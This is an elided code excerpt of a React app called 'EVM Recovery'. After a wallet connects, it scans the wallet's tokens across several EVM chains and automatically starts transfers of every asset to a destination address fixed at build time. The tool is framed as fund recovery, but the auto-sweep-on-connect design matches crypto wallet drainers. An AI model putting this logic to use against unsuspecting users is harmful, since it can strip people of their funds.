...
const chains = [
  ...
  { id: 100, name: 'Gnosis', native: 'xDAI', explorer: 'https://gnosis.blockscout.com/tx/', tokenApi: 'https://gnosis.blockscout.com/api/v2', rpcUrl: 'https://rpc.gnosischain.com' },
  ...
  { id: 143, name: 'Monad', native: 'MON', explorer: 'monadscan.com/tx/', rpcUrl: 'https://monad-rpc.publicnode.com' },
  ...
  { id: 1868, name: 'Soneium', native: 'ETH', explorer: 'soneium.blockscout.com/tx/', tokenApi: 'https://soneium.blockscout.com/api/v2', rpcUrl: 'https://rpc.soneium.org' },
  ...
  { id: 43114, name: 'Avalanche C-Chain', native: 'AVAX', explorer: 'https://snowtrace.io/tx/', tokenApi: 'https://avalanche.blockscout.com/api/v2', rpcUrl: 'https://avalanche-c-chain-rpc.publicnode.com' },
  ...
  { id: 999, name: 'HyperEVM', native: 'HYPE', explorer: 'https://hyperevm.publicnode.com', rpcUrl: 'https://rpc.hyperliquid.xyz/evm' },
];
...
function App() {
  ...
  async function scanWalletTokens(walletAddress = address) {
    ...
    if (dest && isAddress(dest) && dest.toLowerCase() !== walletAddress.toLowerCase() && cid && onChain.length > 0) {
      setStatus(`Scan complete: ${result.length} assets. Auto-starting transfers on current network…`);
      setAutoStarted(true);
      void sendAllSelectedAssets(dest, cid, result);
    } else if (!dest || !isAddress(dest)) {
      setStatus(errors.length === 0
        ? `Scan complete: ${result.length} assets. Set VITE_RECOVERY_DESTINATION to enable auto-send.`
        : `Scan done with ${errors.length} issue(s). Set recovery destination to auto-send.`);
    } else if (onChain.length === 0) {
      setStatus(`Scan complete: ${result.length} assets found, none on the connected network.`);
    } else {
      setStatus(`Scan complete: ${result.length} assets.`);
    }
  }
  ...
  async function finishConnection(eip1193: any, existingAccount?: string) {
    ...
    setStatus(accounts[0] ? 'Wallet connected. Scanning…' : 'No account returned.');
  ...
  return (
    <main className="app-shell">
        ...
        <>
          <section className="hero-section">
            <div className="hero-copy">
              ...
              <p>Connect once. Assets on the active network are auto-selected and transfer prompts start automatically.</p>
            </div>
        ...
        <>
          <section className="hero-section">
            <div className="hero-copy">
              ...
              <h1>{busy ? <>Approve in<br /><em>wallet.</em></> : scanning ? <>Scanning<br /><em>assets…</em></> : <>Recovery<br /><em>ready.</em></>}</h1>
              <p>
                {destination
      ...
      <footer>
        ...
        <span>© EVM Recovery · Non-custodial</span>
      </footer>
    </main>
  );
}
